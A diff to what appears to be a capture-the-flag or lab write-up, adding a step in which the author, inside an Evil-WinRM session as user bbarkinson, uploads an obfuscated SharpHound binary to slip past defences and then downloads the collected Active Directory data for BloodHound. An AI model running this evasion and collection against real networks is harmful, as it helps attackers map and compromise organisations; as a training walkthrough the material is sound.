@@ -619,7 +619,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bbarkinson\Documents> upload SharpHound.exe._obf.exe
 ```
-So ill start by using an obfuscated version of sharphound found below since reguila:
+So ill start by using an obfuscated version of sharphound found below since regular collection methods will not work:
 
 https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/SharpHound.exe._obf.exe
 
@@ -647,3 +647,14 @@ Closing writers
 ```
 This made a .zip file for me which i can download then upload to bloodhound
 
+```python
+*Evil-WinRM* PS C:\Users\bbarkinson\Documents> download 20260317170437_output.zip
+                                        
+Info: Downloading C:\Users\bbarkinson\Documents\20260317170437_output.zip to 20260317170437_output.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\bbarkinson\Documents>
+```
+Now ill ingest it into bloodhound
+
+# Bloodhound
